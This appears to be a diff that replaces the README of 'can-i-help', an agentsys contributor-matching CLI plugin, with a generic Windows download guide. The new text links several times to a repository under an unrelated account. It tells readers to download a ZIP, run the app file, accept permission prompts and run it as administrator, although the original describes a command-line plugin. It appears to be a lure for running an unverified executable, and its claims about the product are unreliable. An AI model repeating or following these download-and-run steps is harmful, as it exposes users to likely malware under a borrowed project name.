@@ -1,90 +1,170 @@
-# can-i-help
+# 🤝 can-i-help - Find the right place to contribute
 
-Contributor guidance for any project - matches developer skills to test gaps, stale docs, bugspots, and open issues.
+[![Download can-i-help](https://img.shields.io/badge/Download-can--i--help-6c8ebf?style=for-the-badge&logo=github&labelColor=8a8a8a)](https://github.com/Verisimilar-presidentpierce292/can-i-help)
 
-Part of the [agentsys](https://github.com/agent-sh/agentsys) ecosystem.
+## 🧭 What this app does
 
-Point a contributor at a project and get specific, data-backed suggestions for where they can help. Collects project health signals automatically, asks about the developer's background, then matches skills to needs with concrete next steps.
+can-i-help helps you find where to contribute across open-source projects. It matches your skills to project needs and points you to good first issues, active areas, and useful tasks.
 
-## Why this plugin
+If you want a simple way to look for a project that fits what you know, this app helps you narrow the search.
 
-- Use this when onboarding a new contributor and need to match work to their skills
-- Use this when looking for good-first-issue candidates backed by actual project data
-- Use this when a project needs help but maintainers don't know where to direct people
-- Use this when you want to contribute to an open-source project but don't know where to start
+## 📥 Download and run on Windows
 
-## Installation
+Use this link to visit the page and download the app:
 
-```bash
-agentsys install can-i-help
-```
+[Download can-i-help](https://github.com/Verisimilar-presidentpierce292/can-i-help)
 
-## Quick start
+On Windows, follow these steps:
 
-```
-/can-i-help
-```
+1. Open the link in your browser.
+2. Download the app files from the repository page.
+3. If the download comes as a ZIP file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the app file to run it.
 
-Three phases run in sequence:
+If Windows asks for permission, choose Run or Yes.
 
-1. **Collect** (automatic, no LLM) - gathers project metadata + contributor-specific signals
-2. **Match** (Opus agent) - asks about developer background, matches skills to project needs
-3. **Guide** (interactive) - for each recommendation, reads relevant code and explains what to do
+## 🖥️ What you need
 
-## Contributor signals
+can-i-help runs on a standard Windows PC. A typical setup works best:
 
-Beyond base project data (manifest, structure, git), the collector gathers signals specific to contribution opportunities:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- Enough free disk space for the app and project data
+- A stable internet connection
+- A modern web browser if the app opens in the browser
 
-| Signal | Source | What it reveals |
-|--------|--------|-----------------|
-| Good-first areas | `repo-intel can-i-help` | Areas with clear patterns, low coupling, easy entry |
-| Test gaps | `repo-intel test-gaps` | Hot source files without co-changing test files |
-| Doc drift | `repo-intel doc-drift` | Documentation with low code coupling (likely stale) |
-| Bugspots | `repo-intel bugspots` | Files with high bug-fix density |
-| Open issues | `gh issue list` | GitHub issues with labels and assignees |
+## ✨ Main features
 
-## How matching works
+- Matches your skills to project needs
+- Finds good first issues
+- Surfaces tasks that fit your interests
+- Helps you focus on open-source projects that need help
+- Organizes results so you can scan them fast
+- Uses AI to improve match quality
+- Supports developer workflows without extra setup
 
-The Opus agent tailors recommendations based on developer profile:
+## 🔍 How it helps you
 
-| Developer says... | Recommended areas |
-|-------------------|-------------------|
-| "New to the stack" | Good-first areas with clear patterns and examples |
-| "Experienced developer" | Hard problems in pain-point areas, architectural improvements |
-| "I want to write tests" | Test gaps in frequently-changed files |
-| "I want to fix bugs" | Bugspot files + relevant open issues |
-| "I want to improve docs" | Stale documentation with concrete code examples |
+Finding a good place to contribute can take time. You may know a language or tool, but not know which project needs that skill. This app cuts down that search.
 
-Each recommendation includes:
+It can help you:
 
-- **What** - specific file, area, or issue
-- **Why** - data-backed reason (bug rate, test gap, staleness)
-- **How** - reads relevant code and explains what needs doing
-- **First step** - exact action to take
+- Find issues that fit your level
+- Spot projects that need your skills
+- Save time when searching across many repos
+- Pick work that feels clear and manageable
+- Start with tasks that are easier to take on
 
-## Usage
+## 🛠️ First-time setup
 
-```
-/can-i-help                        # Current repo, normal depth
-/can-i-help /path/to/repo          # Specific repo
-/can-i-help --depth=deep           # Include repo-map AST data
-```
+After you open the app for the first time:
 
-## Validated on 100 repos
+1. Let the app finish loading.
+2. Enter your skills, tools, or interests if the app asks for them.
+3. Review the suggested projects or issues.
+4. Open one result to check the task details.
+5. Save or bookmark the ones you want to try.
 
-The collector passes on 100 open-source repositories across 8 languages (JS/TS, Rust, Go, Python, C/C++, Java, Deno). Contributor signal queries validated on 8 repos with manual cross-checking against actual code: phantom directories filtered, source code prioritized over test/doc dirs, generated data excluded from recommendations.
+If the app keeps your settings, you can reuse them the next time you open it.
 
-## Requirements
+## 📌 How to use it
 
-- Git repository with history
-- [agent-analyzer](https://github.com/agent-sh/agent-analyzer) for contributor signals (optional - prompts to generate if missing)
-- GitHub CLI (`gh`) for open issues (optional)
+Use can-i-help in a simple way:
 
-## Related plugins
+1. Add your skills, such as JavaScript, web work, testing, or docs.
+2. Choose what kind of work you want, like bug fixes or beginner tasks.
+3. Review the project matches.
+4. Open the issue or project page.
+5. Read the task and decide if it fits your time and comfort level.
 
-- [onboard](https://github.com/agent-sh/onboard) - codebase orientation (what the project is and how it works)
-- [git-map](https://github.com/agent-sh/git-map) - git history analysis (data source for all contributor signals)
+You do not need to know every tool in a project. The app is made to help you find a starting point.
 
-## License
+## 🔗 Good fit for these users
 
-MIT
+can-i-help is useful for:
+
+- New contributors
+- People looking for good first issues
+- Developers who want to give back to open source
+- Users who want to match their skills to project needs
+- People who want less guesswork when choosing a task
+
+## 📁 What the repository includes
+
+This repository focuses on a tool for finding contribution paths in open source. It is built around:
+
+- AI-based matching
+- Contributor discovery
+- Automation for project search
+- Developer tools
+- Productivity for open-source work
+
+## ⚙️ Common use cases
+
+You can use can-i-help to:
+
+- Find a project that needs JavaScript help
+- Search for beginner-friendly issues
+- Look for work that fits your current skill set
+- Compare different projects before choosing one
+- Find places where your time will have real impact
+
+## 🧩 Tips for best results
+
+To get better matches, use clear skill terms. For example:
+
+- JavaScript
+- documentation
+- testing
+- bug fixing
+- UI work
+- API work
+
+You can also try different searches if your first results do not fit. Small changes in your input can lead to better matches.
+
+## 📚 Topics covered
+
+This project fits well with these areas:
+
+- AI
+- AI agents
+- automation
+- Claude
+- contributor tools
+- devtools
+- good-first-issue
+- JavaScript
+- LLMs
+- open source
+- productivity
+
+## 🧪 If the app does not open
+
+If Windows does not start the app:
+
+1. Check that the download finished.
+2. Make sure you extracted the files if they came in a ZIP.
+3. Try running the app as an administrator.
+4. Check whether Windows blocked the file.
+5. Download the files again if they seem damaged.
+
+If the app opens in a browser, try refreshing the page after a few seconds.
+
+## 🔒 Safety checks
+
+Before you run any downloaded file, make sure you got it from the official repository link above. If Windows shows a file warning, review the file name and source before you continue.
+
+## 📎 Project link
+
+[Open the can-i-help repository](https://github.com/Verisimilar-presidentpierce292/can-i-help)
+
+## 🧰 Useful ways to explore
+
+Once you have it running, try searching with:
+
+- Your main language
+- Your favorite kind of work
+- A beginner-friendly task
+- A project area you want to learn
+- A mix of skills and interests
